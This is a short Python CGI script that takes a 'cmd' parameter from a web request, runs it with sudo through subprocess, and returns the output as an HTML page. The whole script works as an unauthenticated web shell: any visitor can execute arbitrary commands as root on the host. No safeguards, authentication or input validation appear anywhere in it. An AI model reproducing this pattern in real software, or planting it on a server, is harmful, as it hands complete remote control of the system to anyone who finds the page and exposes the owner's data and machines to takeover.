#!/usr/local/bin/python3

import cgi
import subprocess


print("content-type: text/html")
print()

my_input = cgi.FieldStorage()

command = my_input.getvalue("cmd")

output = subprocess.getoutput("sudo " +command)
print(output)

